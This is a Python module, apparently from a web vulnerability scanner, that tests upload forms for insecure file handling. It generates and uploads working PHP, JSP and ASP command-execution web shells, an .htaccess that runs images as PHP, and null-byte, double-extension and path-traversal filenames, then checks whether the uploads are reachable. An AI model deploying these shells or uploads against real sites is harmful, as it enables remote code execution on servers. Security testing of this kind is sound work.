import requests
import os
from urllib.parse import urljoin

# File upload vulnerability tests
def test_file_upload(url, forms, session=None):
    """Test for insecure file upload vulnerabilities"""
    issues = []
    
    for form in forms:
        target_url = form["action"]
        
        # Check if form has file upload capability
        has_file_input = any(inp.get("type") == "file" for inp in form.get("inputs", []))
        
        if has_file_input:
            # Test dangerous file types
            dangerous_file_tests = test_dangerous_file_types(target_url, form, session)
            issues.extend(dangerous_file_tests)
            
            # Test filename manipulation
            filename_tests = test_filename_manipulation(target_url, form, session)
            issues.extend(filename_tests)
            
            # Test file size limits
            size_tests = test_file_size_limits(target_url, form, session)
            issues.extend(size_tests)
            
            # Test content-type bypass
            content_type_tests = test_content_type_bypass(target_url, form, session)
            issues.extend(content_type_tests)
            
            # Test directory traversal in filename
            traversal_tests = test_upload_traversal(target_url, form, session)
            issues.extend(traversal_tests)
    
    return issues

def create_test_files():
    """Create test files for upload testing"""
    test_files = {}
    
    # Create a PHP web shell
    php_shell = b'<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
    test_files['php_shell.php'] = ('php_shell.php', php_shell, 'application/x-php')
    
    # Create an HTML file with XSS
    html_xss = b'<html><body><script>alert("XSS")</script></body></html>'
    test_files['xss.html'] = ('xss.html', html_xss, 'text/html')
    
    # Create an executable (fake .exe)
    exe_content = b'MZ\x90\x00' + b'fake_executable'
    test_files['test.exe'] = ('test.exe', exe_content, 'application/x-msdownload')
    
    # Create a JSP shell
    jsp_shell = b'<%@ page import="java.util.*,java.io.*"%><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); %>'
    test_files['shell.jsp'] = ('shell.jsp', jsp_shell, 'application/jsp')
    
    # Create an ASP shell
    asp_shell = b'<%eval request("cmd")%>'
    test_files['shell.asp'] = ('shell.asp', asp_shell, 'application/asp')
    
    # Create .htaccess with command execution
    htaccess = b'AddType application/x-httpd-php .jpg .png'
    test_files['.htaccess'] = ('.htaccess', htaccess, 'application/text')
    
    # Create double extension file
    test_files['test.php.jpg'] = ('test.php.jpg', php_shell, 'image/jpeg')
    
    # Create file with null byte
    test_files['test.php%00.jpg'] = ('test.php\x00.jpg', php_shell, 'image/jpeg')
    
    return test_files

def test_dangerous_file_types(target_url, form, session=None):
    """Test uploading dangerous file types (executables, scripts)"""
    issues = []
    test_files = create_test_files()
    
    # Get file input field
    file_input = next((inp for inp in form.get("inputs", []) if inp.get("type") == "file"), None)
    if not file_input:
        return issues
    
    # Prepare form data with other inputs
    form_data = {}
    for inp in form["inputs"]:
        if inp.get("type") != "file":
            form_data[inp["name"]] = "test_value"
    
    for filename, (actual_name, content, content_type) in test_files.items():
        files = {file_input["name"]: (filename, content, content_type)}
        
        try:
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=form_data, files=files, timeout=10)
                else:
                    response = requests.post(target_url, data=form_data, files=files, timeout=10)
            else:
                # Some forms accept GET with files (unusual but possible)
                if session:
                    response = session.get(target_url, params=form_data, files=files, timeout=10)
                else:
                    response = requests.get(target_url, params=form_data, files=files, timeout=10)
            
            # Check if file was uploaded successfully (200/201 status)
            if response.status_code in [200, 201]:
                # Look for the file in response or try to access it
                uploaded_file_accessible = check_file_accessibility(target_url, filename, response, session)
                
                if uploaded_file_accessible:
                    severity = determine_file_upload_severity(filename)
                    
                    issues.append({
                        "vulnerability": f"Insecure File Upload: {get_file_type_description(filename)}",
                        "url": target_url,
                        "payload": filename,
                        "severity": severity,
                        "description": f"Dangerous file type '{filename}' upload accepted without proper validation",
                        "evidence": f"File uploaded with HTTP {response.status_code} and is potentially accessible",
                        "parameter": file_input["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Implement strict file type validation, whitelist allowed extensions, scan file content, and store uploaded files outside web root with random names"
                    })
                    
        except requests.RequestException:
            continue
    
    return issues

def test_filename_manipulation(target_url, form, session=None):
    """Test for filename manipulation vulnerabilities"""
    issues = []
    
    file_input = next((inp for inp in form.get("inputs", []) if inp.get("type") == "file"), None)
    if not file_input:
        return issues
    
    form_data = {}
    for inp in form["inputs"]:
        if inp.get("type") != "file":
            form_data[inp["name"]] = "test_value"
    
    # Filename manipulation payloads
    dangerous_filenames = [
        "..//etc/passwd",
        "....//....//etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "test.php%00.jpg",
        "test.php\x00.jpg",
        "test.php%2e%2e",
        "test .php",
        "test.php\x0a.jpg",
        "test.php\x0d.jpg"
    ]
    
    test_content = b'test content'
    
    for malicious_filename in dangerous_filenames:
        files = {file_input["name"]: (malicious_filename, test_content, "text/plain")}
        
        try:
            if session:
                response = session.post(target_url, data=form_data, files=files, timeout=10)
            else:
                response = requests.post(target_url, data=form_data, files=files, timeout=10)
            
            # Check for successful upload and potential path traversal
            if response.status_code in [200, 201]:
                # Look for path traversal indicators
                if any(indicator in response.text.lower() for indicator in ['etc/passwd', 'windows/system32', 'file://']):
                    issues.append({
                        "vulnerability": "Path Traversal in File Upload",
                        "url": target_url,
                        "payload": malicious_filename,
                        "severity": "High",
                        "description": "Filename manipulation allows directory traversal, potentially enabling file disclosure or arbitrary file write",
                        "evidence": f"Malicious filename accepted: {malicious_filename}",
                        "parameter": file_input["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Sanitize filenames, remove directory traversal sequences, and use random generated filenames for storage"
                    })
                    break
                    
        except requests.RequestException:
            continue
    
    return issues

def test_file_size_limits(target_url, form, session=None):
    """Test for missing file size limits (DoS potential)"""
    issues = []
    
    file_input = next((inp for inp in form.get("inputs", []) if inp.get("type") == "file"), None)
    if not file_input:
        return issues
    
    # Try to upload an extremely large file
    large_content = b"A" * 100 * 1024 * 1024  # 100MB
    
    form_data = {}
    for inp in form["inputs"]:
        if inp.get("type") != "file":
            form_data[inp["name"]] = "test_value"
    
    files = {file_input["name"]: ("large_file.bin", large_content, "application/octet-stream")}
    
    try:
        if session:
            response = session.post(target_url, data=form_data, files=files, timeout=30)
        else:
            response = requests.post(target_url, data=form_data, files=files, timeout=30)
        
        # If it accepts 100MB file without error, it might be vulnerable to DoS
        if response.status_code in [200, 201] and len(response.text) < 1000000:  # Response not too large
            issues.append({
                "vulnerability": "Missing File Size Limits",
                "url": target_url,
                "payload": "100MB file upload",
                "severity": "Medium",
                "description": "No file size limit enforced, allowing potential DoS attacks",
                "evidence": "Successfully uploaded 100MB file",
                "parameter": file_input["name"],
                "method": "POST",
                "recommendation": "Implement server-side file size limits and validate on both client and server"
            })
            
    except requests.RequestException:
        pass
    
    return issues

def test_content_type_bypass(target_url, form, session=None):
    """Test for content-type validation bypass"""
    issues = []
    
    file_input = next((inp for inp in form.get("inputs", []) if inp.get("type") == "file"), None)
    if not file_input:
        return issues
    
    # Test content-type spoofing
    php_shell = b'<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
    
    form_data = {}
    for inp in form["inputs"]:
        if inp.get("type") != "file":
            form_data[inp["name"]] = "test_value"
    
    # Try to upload PHP as image
    files = {file_input["name"]: ("image.php", php_shell, "image/jpeg")}
    
    try:
        if session:
            response = session.post(target_url, data=form_data, files=files, timeout=10)
        else:
            response = requests.post(target_url, data=form_data, files=files, timeout=10)
        
        if response.status_code in [200, 201]:
            # Check if file is accessible
            accessible = check_file_accessibility(target_url, "image.php", response, session)
            
            if accessible:
                issues.append({
                    "vulnerability": "Content-Type Validation Bypass",
                    "url": target_url,
                    "payload": "PHP file uploaded as image/jpeg",
                    "severity": "Critical",
                    "description": "Server accepts dangerous content based on spoofed content-type header",
                    "evidence": f"PHP shell uploaded and accessible as image (HTTP {response.status_code})",
                    "parameter": file_input["name"],
                    "method": "POST",
                    "recommendation": "Validate file content, not just content-type header. Use server-side file type detection (magic bytes)"
                })
                
    except requests.RequestException:
        pass
    
    return issues

def test_upload_traversal(target_url, form, session=None):
    """Test for directory traversal in uploaded filename"""
    issues = []
    
    file_input = next((inp for inp in form.get("inputs", []) if inp.get("type") == "file"), None)
    if not file_input:
        return issues
    
    form_data = {}
    for inp in form["inputs"]:
        if inp.get("type") != "file":
            form_data[inp["name"]] = "test_value"
    
    test_content = b"traversal test content"
    
    # Try various traversal payloads
    traversal_payloads = [
        "../../test.php",
        "..\\..\\test.php",
        "....//....//test.php",
        "..%2F..%2Ftest.php",
        "%2e%2e%2ftest.php"
    ]
    
    for payload in traversal_payloads:
        files = {file_input["name"]: (payload, test_content, "application/x-php")}
        
        try:
            if session:
                response = session.post(target_url, data=form_data, files=files, timeout=10)
            else:
                response = requests.post(target_url, data=form_data, files=files, timeout=10)
            
            if response.status_code in [200, 201]:
                # Check response for evidence of directory traversal
                if any(indicator in response.text.lower() for indicator in ["/test.php", "../", "..\\", "directory"]):
                    issues.append({
                        "vulnerability": "Directory Traversal in Uploaded Filename",
                        "url": target_url,
                        "payload": payload,
                        "severity": "High",
                        "description": "Uploaded files can be placed in arbitrary directories via path traversal",
                        "evidence": f"Filename traversal successful: {payload}",
                        "parameter": file_input["name"],
                        "method": "POST",
                        "recommendation": "Strip directory traversal sequences from filenames and use absolute paths for uploads"
                    })
                    break
                    
        except requests.RequestException:
            continue
    
    return issues

def check_file_accessibility(url, filename, upload_response, session):
    """Check if uploaded file is accessible via web"""
    # Common upload directories
    upload_dirs = [
        "",
        "/uploads/",
        "/files/",
        "/media/",
        "/assets/",
        "/images/",
        "/userfiles/",
        "/upload/",
        "/tmp/",
    ]
    
    # Try to access the uploaded file
    for upload_dir in upload_dirs:
        test_url = urljoin(url, f"{upload_dir}{filename}")
        
        try:
            if session:
                response = session.get(test_url, timeout=5)
            else:
                response = requests.get(test_url, timeout=5)
            
            # Check if file content is in response or if it's executable script
            if response.status_code == 200 and len(response.text) > 0:
                # For PHP/ASP/JSP, check if it returns HTML not 404
                if any(ext in filename.lower() for ext in ['.php', '.asp', '.jsp', '.html']) and response.headers.get('content-type', '').startswith('text/html'):
                    return True
                    
        except requests.RequestException:
            continue
    
    return False

def determine_file_upload_severity(filename):
    """Determine severity based on file type"""
    if any(ext in filename.lower() for ext in ['.php', '.asp', '.jsp', '.py']):
        return "Critical"
    elif any(ext in filename.lower() for ext in ['.exe', '.sh', '.bat', '.ps1']):
        return "Critical"
    elif '.htaccess' in filename.lower():
        return "Critical"
    elif any(ext in filename.lower() for ext in ['.html', '.htm']):
        return "High"
    else:
        return "Medium"

def get_file_type_description(filename):
    """Get description of file type"""
    if 'php' in filename.lower():
        return "PHP Script"
    elif 'asp' in filename.lower() or 'jsp' in filename.lower():
        return "Server Script"
    elif 'exe' in filename.lower() or 'sh' in filename.lower():
        return "Executable"
    elif 'htaccess' in filename.lower():
        return "Apache Configuration"
    elif 'html' in filename.lower():
        return "HTML/JavaScript"
    else:
        return "Dangerous File Type"

